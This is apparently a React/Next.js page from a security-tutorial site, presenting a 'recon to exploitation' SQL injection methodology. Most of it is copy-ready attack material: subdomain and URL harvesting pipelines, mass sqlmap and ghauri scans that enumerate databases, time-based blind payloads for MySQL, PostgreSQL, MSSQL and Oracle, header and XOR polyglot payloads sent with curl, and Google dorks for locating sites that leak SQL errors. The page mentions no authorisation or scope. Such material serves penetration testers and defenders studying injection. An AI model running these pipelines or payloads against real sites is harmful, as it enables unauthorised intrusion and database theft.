"use client"

import { useState } from "react"
import Image from "next/image"
import { ContentLayout } from "@/components/content-layout"
import { CommandCard } from "@/components/command-card"
import {
  Database, Terminal, ChevronRight, ExternalLink,
  Search, Shield, FileText, Bug, Github, BookOpen, Video,
  Zap, Clock,
} from "lucide-react"

const phases = [
  { id: "introduction", label: "Introduction" },
  { id: "step-1", label: "Step 1 — Recon" },
  { id: "step-2", label: "Step 2 — Endpoints" },
  { id: "step-3", label: "Step 3 — SQL-Prone URLs" },
  { id: "automated-testing", label: "Mass Testing" },
  { id: "time-based", label: "Time-Based Payloads" },
  { id: "header-based", label: "Header SQLi" },
  { id: "xor-techniques", label: "XOR Techniques" },
  { id: "google-dorking", label: "Google Dorking" },
]

export default function SQLInjectionPage() {
  const [activeCategory, setActiveCategory] = useState("introduction")
  const [expandedImg, setExpandedImg] = useState<string | null>(null)

  const scrollToSection = (id: string) => {
    setActiveCategory(id)
    const element = document.getElementById(id)
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" })
    }
  }

  return (
    <ContentLayout
      pageTitle="SQL Injection"
      breadcrumbItems={[
        { label: "Home", href: "/" },
        { label: "Web Vulnerabilities", href: "/vulnerabilities" },
        { label: "SQL Injection" },
      ]}
      hero={{
        icon: Database,
        title: "SQL Injection — Recon to Exploitation",
        description: "A practical step-by-step SQL injection reconnaissance methodology using subdomain enumeration, URL discovery, mass testing and time-based payloads across multiple databases",
        stats: [
          { label: "9 Phases", className: "bg-red-500/10 text-red-500" },
          { label: "5+ DBMS", className: "bg-orange-500/10 text-orange-500" },
          { label: "Copy Ready", className: "bg-secondary text-foreground" },
        ],
        gradient: "from-red-500/10 via-background to-orange-500/5",
        iconBg: "bg-red-500/10 text-red-500",
      }}
      phases={phases}
      activeCategory={activeCategory}
      onPhaseChange={scrollToSection}
      navActiveClass="bg-red-500 text-white"
      expandedImg={expandedImg}
      onLightboxClose={() => setExpandedImg(null)}
      onLightboxOpen={(src) => setExpandedImg(src)}
    >

          {/* Introduction */}
          <section id="introduction" className="scroll-mt-24">
            <h2 className="mb-4 text-2xl font-bold text-foreground">Introduction</h2>
            <p className="text-muted-foreground leading-relaxed">
              SQL Injection remains one of the most critical web vulnerabilities, allowing attackers to manipulate backend databases through unsanitized inputs. Effective reconnaissance is key to identifying potential SQLi points before exploitation. This article walks you through a practical, step-by-step SQLi reconnaissance methodology using popular tools and payloads.
            </p>
          </section>

          {/* Step 1 — Recon the Target Subdomains */}
          <section id="step-1" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-red-500/10 text-red-500">
                <Search className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-red-500">Step 1</span>
                <h2 className="text-2xl font-bold text-foreground">Recon the Target Subdomains</h2>
              </div>
            </div>
            <p className="mb-6 text-muted-foreground leading-relaxed">
              Before testing for SQLi you need to discover the attack surface &mdash; the subdomains and URLs that might be vulnerable.
            </p>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Single Domain</h3>
            <CommandCard
              command="subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'"
              description="Enumerate subdomains and filter dynamic pages"
              index={1}
            />

            <h3 className="mb-3 mt-6 text-lg font-semibold text-foreground">Multiple Domains from a File</h3>
            <CommandCard
              command="subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'"
              description="Bulk subdomain enumeration from a file"
              index={2}
            />

            <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/sql-injection/1d51477e63e649f20235952f07858ea4f2325de7.webp")}>
              <Image src="/images/vulnerabilities/sql-injection/1d51477e63e649f20235952f07858ea4f2325de7.webp" alt="Subdomain recon results" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
          </section>

          {/* Step 2 — Discovering Potential SQLi Endpoints */}
          <section id="step-2" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-red-500/10 text-red-500">
                <FileText className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-red-500">Step 2</span>
                <h2 className="text-2xl font-bold text-foreground">Discovering Potential SQL Injection Endpoints</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              To find URLs with parameters (common SQLi entry points) use:
            </p>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Using GAU</h3>
            <CommandCard
              command='echo https://example.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep "=" >urls.txt'
              description="Gather parameterized URLs with GAU"
              index={3}
            />

            <h3 className="mb-3 mt-6 text-lg font-semibold text-foreground">Using Katana (deeper crawl)</h3>
            <CommandCard
              command='echo https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" >urls2.txt'
              description="Deep crawl with Katana for more URLs"
              index={4}
            />

            <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/sql-injection/a1f1994e82221836a7ddcd38e5bc74fbec3eb4be.webp")}>
              <Image src="/images/vulnerabilities/sql-injection/a1f1994e82221836a7ddcd38e5bc74fbec3eb4be.webp" alt="GAU and Katana results" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
          </section>

          {/* Step 3 — Identify SQL-Prone URLs */}
          <section id="step-3" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-red-500/10 text-red-500">
                <Shield className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-red-500">Step 3</span>
                <h2 className="text-2xl font-bold text-foreground">Identify SQL-Prone URLs</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              Use <code className="rounded bg-muted px-1 py-0.5 text-xs">gf</code> to extract endpoints with potential SQL injection points and clean them up:
            </p>
            <CommandCard
              command="cat urls1.txt urls2.txt | gf sqli | uro > cleaned-sql.txt"
              description="Extract SQLi-prone URLs using gf patterns"
              index={5}
            />
          </section>

          {/* Automate Mass SQL Injection Testing */}
          <section id="automated-testing" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-red-500/10 text-red-500">
                <Zap className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-red-500">Tool</span>
                <h2 className="text-2xl font-bold text-foreground">Automate Mass SQL Injection Testing</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              Once you have a list of URLs, automate testing with tools like ghauri or sqlmap:
            </p>

            <div className="space-y-2">
              <CommandCard command="ghauri -m cleaned-sql.txt --batch --dbs --level 3 --confirm" description="Mass SQLi testing with ghauri" index={6} />
              <CommandCard command="sqlmap -m cleaned-sql.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs" description="Mass SQLi testing with sqlmap" index={7} />
            </div>

            <h3 className="mb-3 mt-6 text-lg font-semibold text-foreground">Using ghauri</h3>
            <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/sql-injection/cc0f3bdc1105d808ba08d3d6918c3ae408133a47.webp")}>
              <Image src="/images/vulnerabilities/sql-injection/cc0f3bdc1105d808ba08d3d6918c3ae408133a47.webp" alt="Ghauri scan results" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>

            <h3 className="mb-3 mt-6 text-lg font-semibold text-foreground">Full Automation Pipeline</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              Combine subdomain discovery, URL gathering, filtering and automated scanning:
            </p>
            <CommandCard
              command="subfinder -d example.com -all -silent | gau --threads 50 | uro | gf sqli > sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm"
              description="Full automation pipeline with ghauri"
              index={8}
            />
            <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/sql-injection/278dfe6e89d8ab7cbc5d5e4baa65e31fe8f784a7.webp")}>
              <Image src="/images/vulnerabilities/sql-injection/278dfe6e89d8ab7cbc5d5e4baa65e31fe8f784a7.webp" alt="Full automation pipeline" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>

            <h3 className="mb-3 mt-6 text-lg font-semibold text-foreground">SQLMap Automation Pipeline</h3>
            <CommandCard
              command="subfinder -d example.com -all -silent | gau | urldedupe | gf sqli > sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent"
              description="Full automation pipeline with sqlmap"
              index={9}
            />
          </section>

          {/* Time-Based Blind SQL Injection Payloads */}
          <section id="time-based" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-red-500/10 text-red-500">
                <Clock className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-red-500">DB</span>
                <h2 className="text-2xl font-bold text-foreground">Time-Based Blind SQL Injection Payloads</h2>
              </div>
            </div>
            <p className="mb-6 text-muted-foreground leading-relaxed">
              Time delays are effective for blind SQLi detection when no error messages are shown. Here are payloads for manual testing for different databases:
            </p>

            <h3 className="mb-3 text-lg font-semibold text-foreground">MySQL</h3>
            <div className="space-y-2">
              <CommandCard command="SELECT SLEEP(10);" description="Basic MySQL time-based delay" index={10} />
              <CommandCard command="0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" description="Inline injection with logic" index={11} />
              <CommandCard command="1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(FLOOR(RAND()*2),(SELECT SLEEP(5))) AS x FROM information_schema.tables GROUP BY x) y);" description="Benchmark-based delay" index={12} />
              <CommandCard command="' OR IF(1=1, SLEEP(10), 0)-- -" description="Boolean logic delay" index={13} />
            </div>

            <h3 className="mb-3 mt-6 text-lg font-semibold text-foreground">PostgreSQL</h3>
            <div className="space-y-2">
              <CommandCard command="SELECT pg_sleep(10);" description="Standard PostgreSQL time-based delay" index={14} />
              <CommandCard command="' OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < interval '0:0:10') THEN (SELECT '1' || pg_sleep(10)) ELSE '0' END)='1" description="Conditional delay with string concatenation" index={15} />
              <CommandCard command="' OR 1=1; SELECT pg_sleep(5);--" description="Concise PostgreSQL delay" index={16} />
              <CommandCard command="' OR (SELECT CASE WHEN (random() < 0.5) THEN pg_sleep(5) ELSE pg_sleep(0) END);--" description="Variable delay with random()" index={17} />
            </div>

            <h3 className="mb-3 mt-6 text-lg font-semibold text-foreground">Microsoft SQL Server</h3>
            <div className="space-y-2">
              <CommandCard command="WAITFOR DELAY '00:00:10';" description="Basic MSSQL delay" index={18} />
              <CommandCard command="'; WAITFOR DELAY '00:00:05'; --" description="Inline SQLi payload" index={19} />
              <CommandCard command="IF (1=1) WAITFOR DELAY '0:0:10';" description="Conditional delay" index={20} />
              <CommandCard command="'; IF EXISTS (SELECT * FROM users) WAITFOR DELAY '00:00:07';--" description="IF EXISTS delay" index={21} />
            </div>

            <h3 className="mb-3 mt-6 text-lg font-semibold text-foreground">Oracle</h3>
            <div className="space-y-2">
              <CommandCard command="BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END;" description="Basic Oracle time delay" index={22} />
              <CommandCard command="' OR 1=1; BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END;--" description="Oracle SQLi inline payload" index={23} />
              <CommandCard command="DECLARE v INTEGER; BEGIN IF 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END IF; END;" description="Conditional Oracle delay" index={24} />
            </div>
          </section>

          {/* Header-Based SQLi Testing */}
          <section id="header-based" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-red-500/10 text-red-500">
                <Terminal className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-red-500">Header</span>
                <h2 className="text-2xl font-bold text-foreground">Header-Based SQLi Testing</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              Some endpoints reflect headers like User-Agent, Referer or X-Forwarded-For. Inject payloads there:
            </p>

            <h4 className="mb-2 font-medium text-foreground">Example Payloads</h4>
            <div className="mb-6 rounded-lg border border-border bg-card">
              <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">HTTP Headers</div>
              <pre className="overflow-x-auto p-4 text-sm text-foreground"><code>{`User-Agent: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'"`}</code></pre>
            </div>

            <h4 className="mb-2 font-medium text-foreground">Testing with Curl</h4>
            <div className="space-y-2">
              <CommandCard command={`time curl -s -H "User-Agent: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" "https://target.com/vulnerable-endpoint"`} description="Test User-Agent header SQLi" index={25} />
              <CommandCard command={`time curl -s -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" "https://target.com/vulnerable-endpoint"`} description="Test X-Forwarded-For header SQLi" index={26} />
              <CommandCard command={`time curl -s -H "Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'\\"" "https://target.com/vulnerable-endpoint"`} description="Test Referer header SQLi" index={27} />
            </div>
          </section>

          {/* XOR-Based SQLi Techniques */}
          <section id="xor-techniques" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-red-500/10 text-red-500">
                <Bug className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-red-500">XOR</span>
                <h2 className="text-2xl font-bold text-foreground">Mastering XOR-Based SQL Injection Techniques</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              Explore how XOR logic in SQL payloads like <code className="rounded bg-muted px-1 py-0.5 text-xs">if(now()=sysdate(),sleep(10),0)</code> can be weaponized for bypassing filters and triggering precise time-based detection.
            </p>

            <h3 className="mb-3 text-lg font-semibold text-foreground">XOR Polyglot Payload</h3>
            <div className="mb-6 rounded-lg border border-border bg-card">
              <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">SQL</div>
              <pre className="overflow-x-auto p-4 text-sm text-foreground"><code>{`if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/`}</code></pre>
            </div>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Test with Curl</h3>
            <div className="mb-6 rounded-lg border border-border bg-card p-5">
              <CommandCard
                command={`time curl "https://target.com/page.php?id=if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/"`}
                description="Test XOR polyglot payload via curl"
                index={28}
              />
            </div>

            <div className="mb-6 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/sql-injection/fe3b65e95a31604350c32d88109a3449e98ca140.webp")}>
              <Image src="/images/vulnerabilities/sql-injection/fe3b65e95a31604350c32d88109a3449e98ca140.webp" alt="XOR polyglot curl test" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
            <p className="mb-4 text-sm text-muted-foreground">
              If the server takes approximately 10 seconds to respond, it strongly indicates a time-based SQL injection vulnerability.
            </p>
            <p className="mb-4 text-sm text-muted-foreground">
              You can also download a full list of advanced XOR-based SQL injection payloads and for other DBMS from my GitHub repository here:
            </p>
            <a
              href="https://github.com/coffinxp/loxs/tree/main/payloads/sqli"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center gap-2 rounded-lg bg-red-500/10 px-4 py-2 text-sm font-medium text-red-500 hover:bg-red-500/20"
            >
              <Github className="h-4 w-4" />
              coffinxp/loxs — SQLi Payloads
              <ExternalLink className="h-3 w-3" />
            </a>
          </section>

          {/* Advanced Google Dorking */}
          <section id="google-dorking" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-red-500/10 text-red-500">
                <Search className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-red-500">Dork</span>
                <h2 className="text-2xl font-bold text-foreground">Advanced Google Dorking for SQL Injection Recon</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              Google dorks can help find potentially vulnerable pages. Use the following Google dorks to identify endpoints, parameterized URLs and database error-prone pages that could indicate SQL injection potential.
            </p>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Find URLs with Query Parameters</h3>
            <div className="mb-4 rounded-lg border border-border bg-card">
              <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Google Dorks</div>
              <pre className="overflow-x-auto p-4 text-sm text-foreground"><code>{`site:*.domain.com inurl:id=
site:*.domain.com inurl=product.php?id=
site:*.domain.com inurl=view.php?page=
site:*.domain.com inurl=item.php?cat=`}</code></pre>
            </div>

            <h3 className="mb-3 text-lg font-semibold text-foreground">By File Extension</h3>
            <div className="mb-4 rounded-lg border border-border bg-card">
              <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Google Dorks</div>
              <pre className="overflow-x-auto p-4 text-sm text-foreground"><code>{`site:*.domain.com ext:php
site:*.domain.com ext:asp
site:*.domain.com ext:aspx
site:*.domain.com ext:jsp
site:*.domain.com ext:jspx
site:*.domain.com ext:cfm
site:*.domain.com ext:pl`}</code></pre>
            </div>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Combine Extension + Parameters</h3>
            <div className="mb-4 rounded-lg border border-border bg-card">
              <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Google Dorks</div>
              <pre className="overflow-x-auto p-4 text-sm text-foreground"><code>{`site:*.domain.com ext:php inurl:id=
site:*.domain.com ext:aspx inurl=productid=
site:*.domain.com ext:jsp inurl=categoryid=`}</code></pre>
            </div>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Error-Based Fingerprinting</h3>

            <h4 className="mb-2 font-medium text-foreground">MySQL Errors</h4>
            <div className="mb-4 rounded-lg border border-border bg-card">
              <pre className="overflow-x-auto p-4 text-sm text-foreground"><code>{`# MySQL Errors
site:*.domain.com intext:"You have an error in your SQL syntax"
site:*.domain.com intext:"mysql_fetch_array() expects parameter"
site:*.domain.com intext:"mysql_num_rows() expects parameter"
site:*.domain.com intext:"supplied argument is not a valid MySQL result resource"
site:*.domain.com intext:"Warning: mysql_"
site:*.domain.com intext:"Fatal error: Uncaught mysqli_sql_exception"

# MariaDB / PDO Errors
site:*.domain.com intext:"Fatal error: Call to undefined function mysql_connect()"
site:*.domain.com intext:"Warning: PDO::query()"
site:*.domain.com intext:"SQLSTATE[HY000]"

# PostgreSQL Errors
site:*.domain.com intext:"pg_query(): Query failed"
site:*.domain.com intext:"Warning: pg_connect()"
site:*.domain.com intext:"PostgreSQL query failed: ERROR"

# Microsoft SQL Server Errors
site:*.domain.com intext:"Microsoft OLE DB Provider for SQL Server"
site:*.domain.com intext:"Unclosed quotation mark after the character string"
site:*.domain.com intext:"ADODB.Field error"
site:*.domain.com intext:"80040e14"

# Oracle DB Errors
site:*.domain.com intext:"ORA-00933: SQL command not properly ended"
site:*.domain.com intext:"ORA-01756: quoted string not properly terminated"
site:*.domain.com intext:"Warning: oci_parse()"

# DB2 / Informix / Misc
site:*.domain.com intext:"DB2 SQL error:"
site:*.domain.com intext:"Syntax error in string in query expression"
site:*.domain.com intext:"Error Executing Database Query"

# Generic SQL Error Patterns
site:*.domain.com intext:"Query failed:"
site:*.domain.com intext:"unexpected end of SQL command"
site:*.domain.com intext:"invalid SQL statement"
site:*.domain.com intext:"JDBC Exception"`}</code></pre>
            </div>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Google Dork Automation</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              You can automate these dorks using my custom dorking script to quickly discover more SQL injection points. I&apos;ve also written an article covering some advanced techniques including Google Dorking Automation.
            </p>
            <a
              href="https://github.com/coffinxp/scripts/blob/main/dorking.py"
              target="_blank"
              rel="noopener noreferrer"
              className="mb-6 inline-flex items-center gap-2 rounded-lg bg-red-500/10 px-4 py-2 text-sm font-medium text-red-500 hover:bg-red-500/20"
            >
              <Github className="h-4 w-4" />
              coffinxp/scripts — dorking.py
              <ExternalLink className="h-3 w-3" />
            </a>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Using Loxs Tool</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              You can also test time-based payloads for all types of DBMS using our Loxs tool, which is specially designed to detect time-based SQL injection vulnerabilities effectively.
            </p>
            <a
              href="https://github.com/coffinxp/loxs"
              target="_blank"
              rel="noopener noreferrer"
              className="mb-8 inline-flex items-center gap-2 rounded-lg bg-red-500/10 px-4 py-2 text-sm font-medium text-red-500 hover:bg-red-500/20"
            >
              <Github className="h-4 w-4" />
              coffinxp/loxs
              <ExternalLink className="h-3 w-3" />
            </a>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Video Walkthroughs</h3>
            <div className="grid gap-3 sm:grid-cols-2">
              {[
                ["SQLi Recon Methodology", "https://www.youtube.com/watch?v=HD9201YJTfQ"],
                ["Advanced SQLi Techniques", "https://www.youtube.com/watch?v=x1z4GxDtEo0"],
                ["Time-Based SQLi Deep Dive", "https://www.youtube.com/watch?v=KhVMSTYgMxc&t=367s"],
                ["XOR Polyglot Payloads", "https://www.youtube.com/watch?v=Eu1_LbUzdR0"],
              ].map(([title, url]) => (
                <a key={url} href={url} target="_blank" rel="noopener noreferrer"
                  className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-red-500/50">
                  <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-red-500/10 text-red-500">
                    <Video className="h-4 w-4" />
                  </div>
                  <div className="min-w-0 flex-1">
                    <div className="font-medium text-foreground group-hover:text-red-500">{title}</div>
                    <p className="mt-1 text-xs text-muted-foreground truncate">{url}</p>
                  </div>
                </a>
              ))}
            </div>

            <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Tips</h3>
            <ul className="space-y-2 text-muted-foreground">
              {[
                "Test both GET and POST requests.",
                "Try tamper scripts like space2comment, between, or charencode with sqlmap.",
                "Mix payloads into JSON bodies, XML, headers and cookies.",
                "Monitor 5xx errors, long delays, and unusual behavior — even without data extraction.",
                "Use a proxy like Burp to see responses in real-time.",
              ].map((item) => (
                <li key={item} className="flex items-start gap-2">
                  <ChevronRight className="mt-1 h-3 w-3 shrink-0 text-red-500" />
                  <span>{item}</span>
                </li>
              ))}
            </ul>
          </section>

          {/* Conclusion */}
          <section className="scroll-mt-24">
            <div className="rounded-xl border border-red-500/20 bg-gradient-to-br from-red-500/5 via-background to-orange-500/5 p-8">
              <h2 className="mb-4 text-2xl font-bold text-foreground text-center">Conclusion</h2>
              <p className="text-center text-muted-foreground leading-relaxed max-w-3xl mx-auto">
                SQL Injection reconnaissance is a multi-step process involving subdomain enumeration, URL discovery, mass testing and payload injection. Using the right tools and payloads tailored for different databases increases your chances of finding vulnerabilities efficiently.
              </p>
            </div>
          </section>

          {/* Tools & Resources */}
          <section className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-red-500/10 text-red-500">
                <ExternalLink className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-red-500">Tools</span>
                <h2 className="text-2xl font-bold text-foreground">Tools & Resources</h2>
              </div>
            </div>
            <div className="grid gap-3 sm:grid-cols-2">
              <a href="https://github.com/coffinxp/loxs/tree/main/payloads/sqli" target="_blank" rel="noopener noreferrer"
                className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-red-500/50 hover:shadow-lg hover:shadow-red-500/5">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-red-500/10 text-red-500">
                  <Bug className="h-4 w-4" />
                </div>
                <div className="min-w-0 flex-1">
                  <div className="font-medium text-foreground group-hover:text-red-500">Loxs SQLi Payloads</div>
                  <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Advanced XOR-based SQL injection payloads for all DBMS</p>
                </div>
              </a>
              <a href="https://github.com/coffinxp/scripts/blob/main/dorking.py" target="_blank" rel="noopener noreferrer"
                className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-red-500/50 hover:shadow-lg hover:shadow-red-500/5">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-red-500/10 text-red-500">
                  <Search className="h-4 w-4" />
                </div>
                <div className="min-w-0 flex-1">
                  <div className="font-medium text-foreground group-hover:text-red-500">Dorking Automation</div>
                  <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Automated Google dorking script for SQLi recon</p>
                </div>
              </a>
              <a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener noreferrer"
                className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-red-500/50 hover:shadow-lg hover:shadow-red-500/5">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-red-500/10 text-red-500">
                  <Terminal className="h-4 w-4" />
                </div>
                <div className="min-w-0 flex-1">
                  <div className="font-medium text-foreground group-hover:text-red-500">SQLMap</div>
                  <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Automated SQL injection detection and exploitation tool</p>
                </div>
              </a>
              <a href="https://github.com/r0oth3x49/ghauri" target="_blank" rel="noopener noreferrer"
                className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-red-500/50 hover:shadow-lg hover:shadow-red-500/5">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-red-500/10 text-red-500">
                  <Zap className="h-4 w-4" />
                </div>
                <div className="min-w-0 flex-1">
                  <div className="font-medium text-foreground group-hover:text-red-500">Ghauri</div>
                  <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Advanced SQL injection detection tool</p>
                </div>
              </a>
            </div>
          </section>

    </ContentLayout>
  )
}
